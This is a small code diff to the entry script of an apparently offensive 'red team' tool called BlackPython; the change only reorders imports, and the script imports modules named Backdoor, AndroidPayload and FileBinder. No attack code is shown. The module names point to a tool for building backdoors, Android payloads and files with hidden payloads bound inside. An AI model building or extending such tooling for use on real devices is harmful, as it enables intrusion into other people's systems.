@@ -1,8 +1,9 @@
+import os
+import sys
 from core.backdoor import Backdoor
 from core.android import AndroidPayload
 from core.binder import FileBinder
 import argparse
-import sys
 
 def main():
     parser = argparse.ArgumentParser(description="BlackPython - Herramienta de Red Team")
